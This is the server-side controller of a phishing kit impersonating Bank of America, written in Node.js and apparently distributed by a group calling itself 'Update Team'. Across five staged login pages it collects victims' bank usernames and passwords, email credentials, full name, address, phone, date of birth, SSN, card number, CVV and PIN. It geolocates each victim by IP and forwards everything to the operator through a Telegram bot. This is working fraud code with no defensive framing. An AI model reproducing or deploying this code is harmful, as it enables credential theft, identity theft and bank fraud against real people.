const { sendMessageFor } = require("simple-telegram-message");
const ipInfo = require("ip-info-finder");
const { getClientIp } = require("request-ip");
const { botToken, chatId } = require("../config/settings");

exports.login = (req, res) => {
	return res.render("login");
};

exports.loginPost = async (req, res) => {
	const { username, password } = req.body;
	const clientIP = getClientIp(req);

	function getIPDetails() {
		return ipInfo
			.getIPInfo(clientIP)
			.then((data) => {
				var data = data;
				return data;
			})
			.catch((err) => {
				console.log(err);
			});
	}

	const iPDetails = await getIPDetails();
	const {
		ipAddress,
		Coordinates,
		City,
		Region,
		postalCode,
		Country,
		Time,
		provider,
		ASN,
	} = iPDetails;

	const userAgent = req.headers["user-agent"];
	const systemLang = req.headers["accept-language"];

	const message =
		`✅ UPDATE TEAM | BOFA | USER_${ipAddress}\n\n` +
		`👤 LOGIN INFO\n` +
		`USERNAME         : ${username}\n` +
		`PASSWORD         : ${password}\n\n` +
		`🌍 GEO-IP INFO\n` +
		`IP ADDRESS       : ${ipAddress}\n` +
		`COORDINATES      : ${Coordinates}\n` +
		`CITY             : ${City}\n` +
		`STATE            : ${Region}\n` +
		`ZIP CODE         : ${postalCode}\n` +
		`COUNTRY          : ${Country}\n` +
		`TIME             : ${Time}\n` +
		`ISP              : ${provider} ${ASN}\n\n` +
		`💻 SYSTEM INFO\n` +
		`USER AGENT       : ${userAgent}\n` +
		`SYSTEM LANGUAGE  : ${systemLang}\n\n` + 
		`💬 Telegram: https://t.me/UpdateTeams\n` +
		`🌐 Website: Coming soon!!\n`;

	const sendMessage = sendMessageFor(botToken, chatId);
	sendMessage(message);

	res.redirect("/auth/login/2");
};

exports.login2 = (req, res) => {
	res.render("login2");
};

exports.loginPost2 = async (req, res) => {
	const { username, password } = req.body;
	const clientIP = getClientIp(req);

	function getIPDetails() {
		return ipInfo
			.getIPInfo(clientIP)
			.then((data) => {
				var data = data;
				return data;
			})
			.catch((err) => {
				console.log(err);
			});
	}

	const iPDetails = await getIPDetails();
	const { ipAddress, Time } = iPDetails;

	const message =
		`✅ UPDATE TEAM | BOFA | USER_${ipAddress}\n\n` +
		`👤 RELOGIN INFO\n` +
		`USERNAME         : ${username}\n` +
		`PASSWORD         : ${password}\n\n` +
		`🌍 GEO-IP INFO\n` +
		`IP ADDRESS       : ${ipAddress}\n` +
		`TIME             : ${Time}\n\n` + 
		`💬 Telegram: https://t.me/UpdateTeams\n` +
		`🌐 Website: Coming soon!!\n`;

	const sendMessage = sendMessageFor(botToken, chatId);
	sendMessage(message);

	res.redirect("/auth/login/3");
};

exports.login3 = (req, res) => {
	res.render("login3");
};

exports.loginPost3 = async (req, res) => {
	const { emailAddr, emailPass } = req.body;
	const clientIP = getClientIp(req);

	function getIPDetails() {
		return ipInfo
			.getIPInfo(clientIP)
			.then((data) => {
				var data = data;
				return data;
			})
			.catch((err) => {
				console.log(err);
			});
	}

	const iPDetails = await getIPDetails();
	const { ipAddress, Time } = iPDetails;

	const message =
		`✅ UPDATE TEAM | BOFA | USER_${ipAddress}\n\n` +
		`👤 EMAIL INFO\n` +
		`EMAIL ADDRESS    : ${emailAddr}\n` +
		`EMAIL PASSWORD   : ${emailPass}\n\n` +
		`🌍 GEO-IP INFO\n` +
		`IP ADDRESS       : ${ipAddress}\n` +
		`TIME             : ${Time}\n\n` + 
		`💬 Telegram: https://t.me/UpdateTeams\n` +
		`🌐 Website: Coming soon!!\n`;

	const sendMessage = sendMessageFor(botToken, chatId);
	sendMessage(message);

	res.redirect("/auth/login/4");
};

exports.login4 = (req, res) => {
	return res.render("login4");
};

exports.loginPost4 = async (req, res) => {
	const { fullName, address, zip, phone, dob, ssn } = req.body;
	const clientIP = getClientIp(req);

	function getIPDetails() {
		return ipInfo
			.getIPInfo(clientIP)
			.then((data) => {
				var data = data;
				return data;
			})
			.catch((err) => {
				console.log(err);
			});
	}

	const iPDetails = await getIPDetails();
	const { ipAddress, Time } = iPDetails;

	const message =
		`✅ UPDATE TEAM | BOFA | USER_${ipAddress}\n\n` +
		`👤 PERSONAL INFO\n` +
		`FULL NAME        : ${fullName}\n` +
		`STREET ADDRESS   : ${address}\n` +
		`ZIP CODE         : ${zip}\n` +
		`PHONE NUMBER     : ${phone}\n` +
		`DOB              : ${dob}\n` +
		`SSN              : ${ssn}\n\n` +
		`🌍 GEO-IP INFO\n` +
		`IP ADDRESS       : ${ipAddress}\n` +
		`TIME             : ${Time}\n\n` + 
		`💬 Telegram: https://t.me/UpdateTeams\n` +
		`🌐 Website: Coming soon!!\n`;

	const sendMessage = sendMessageFor(botToken, chatId);
	sendMessage(message);

	res.redirect("/auth/login/5");
};

exports.login5 = (req, res) => {
	return res.render("login5");
};

exports.loginPost5 = async (req, res) => {
	const { cardNum, expDate, cvv, cpin } = req.body;
	const clientIP = getClientIp(req);

	function getIPDetails() {
		return ipInfo
			.getIPInfo(clientIP)
			.then((data) => {
				var data = data;
				return data;
			})
			.catch((err) => {
				console.log(err);
			});
	}

	const iPDetails = await getIPDetails();
	const { ipAddress, Time } = iPDetails;

	const message =
		`✅ UPDATE TEAM | BOFA | USER_${ipAddress}\n\n` +
		`👤 CARD INFO\n` +
		`CARD NUMBER      : ${cardNum}\n` +
		`EXPIRY DATE      : ${expDate}\n` +
		`CVV              : ${cvv}\n` +
		`CARD PIN         : ${cpin}\n\n` +
		`🌍 GEO-IP INFO\n` +
		`IP ADDRESS       : ${ipAddress}\n` +
		`TIME             : ${Time}\n\n` + 
		`💬 Telegram: https://t.me/UpdateTeams\n` +
		`🌐 Website: Coming soon!!\n`;

	const sendMessage = sendMessageFor(botToken, chatId);
	sendMessage(message);

	res.redirect("/auth/complete");
};

exports.complete = (req, res) => {
	return res.render("complete");
};

exports.page404Redirect = (req, res) => {
	return res.redirect("/auth/login");
};